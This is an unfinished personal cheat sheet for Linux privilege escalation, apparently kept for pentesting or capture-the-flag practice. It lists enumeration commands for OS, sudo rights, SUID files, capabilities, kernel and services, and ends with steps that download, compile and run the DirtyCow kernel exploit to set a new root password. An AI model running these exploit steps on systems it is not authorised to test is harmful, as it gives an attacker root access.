# Privilege escalation \[in progress]

### OS Info

```bash
lsb_release -a
getconf LONG_BIT # 32 or 64 bits linux
cat /etc/os-release 
cat /etc/redhat-release # redhat  dists
```

### SUDO Perms && SUID Files && Capabilities

<pre class="language-bash"><code class="lang-bash"><strong>sudo -l # si aparece algo -> https://gtfobins.github.io/
</strong><strong>
</strong><strong>find / \-perm -4000 2>/dev/null # Suid
</strong><strong>getcap -r / 2>/dev/null # caps
</strong><strong>
</strong><strong>find / \-user &#x3C;user> 2>/dev/null # buscar archivos q pertezcan al user x
</strong></code></pre>

### Kernel enumerate

```bash
cat /proc/version
uname -a
+------------+
searchexploit "Linux Kernel X.X"
```

### Services Running

```bash
systemctl --type=service --state=running
systemd-cgtop
ps aux
ps -ef
top -n 1
service --status-all
```

#### DirtyCow (Linux Kernel <= 3.19.0-73.8)

[https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

```bash
wget https://github.com/FireFart/dirtycow/blob/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
./dirty <new-pass>
```

### LinPeass

```
```





